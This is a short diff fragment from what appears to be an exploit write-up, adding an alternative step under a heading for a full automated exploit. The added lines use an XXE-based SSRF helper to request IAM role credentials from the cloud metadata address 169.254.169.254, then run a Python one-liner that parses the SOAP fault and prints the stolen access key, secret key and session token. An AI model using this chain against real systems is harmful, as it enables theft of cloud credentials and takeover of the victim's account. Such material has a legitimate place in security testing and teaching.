@@ -207,6 +207,11 @@ if fault is not None and fault.text:
         print('Expiration:      ', creds.get('Expiration'))
         print('Endpoint note:   ', creds.get('_rpal_endpoint'))
 "
+OR
+
+xxe_ssrf "http://169.254.169.254/latest/meta-data/iam/security-credentials/rpal-upstream-api-role" \
+| python3 -c $'import sys, re, json, html\nimport xml.etree.ElementTree as ET\nraw = sys.stdin.read()\ntry:\n    root = ET.fromstring(raw)\n    fs = root.findtext(".//{http://schemas.xmlsoap.org/soap/envelope/}faultstring") or root.findtext(".//faultstring") or raw\nexcept Exception:\n    fs = raw\nfs = html.unescape(fs)\nm = re.search(r"\\{.*?\\}", fs, re.S)\nif not m:\n    print("No JSON found. Raw response below:\\n" + raw)\n    raise SystemExit(1)\ncreds = json.loads(m.group(0))\nfor k in ("AccessKeyId","SecretAccessKey","Token","Expiration","_rpal_endpoint","_rpal_note"):\n    print("%s: %s" % (k, creds.get(k, "")))'
+
 ```
 
 ### 3.3 — Full Automated Exploit
